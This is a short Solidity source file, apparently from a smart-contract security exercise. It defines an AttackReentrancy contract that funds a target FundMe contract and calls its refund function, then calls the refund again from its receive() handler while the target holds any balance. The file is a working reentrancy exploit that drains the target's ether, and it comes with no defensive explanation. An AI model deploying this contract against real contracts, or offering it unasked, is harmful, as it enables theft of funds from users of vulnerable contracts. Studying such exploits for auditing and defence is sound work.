// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFundMe {
    function fund() external payable;
    function getRefund() external;
}

contract AttackReentrancy {
    IFundMe public fundMe;
    address public owner;

    constructor(address _fundMe) {
        fundMe = IFundMe(_fundMe);
        owner = msg.sender;
        
    }

    function deposit() external payable {
        fundMe.fund{value: msg.value}();
    }

    function attack() external {
        fundMe.getRefund();
    }

    receive() external payable {
        if (address(fundMe).balance > 0) {
            fundMe.getRefund(); // 重入
        }
    }

}

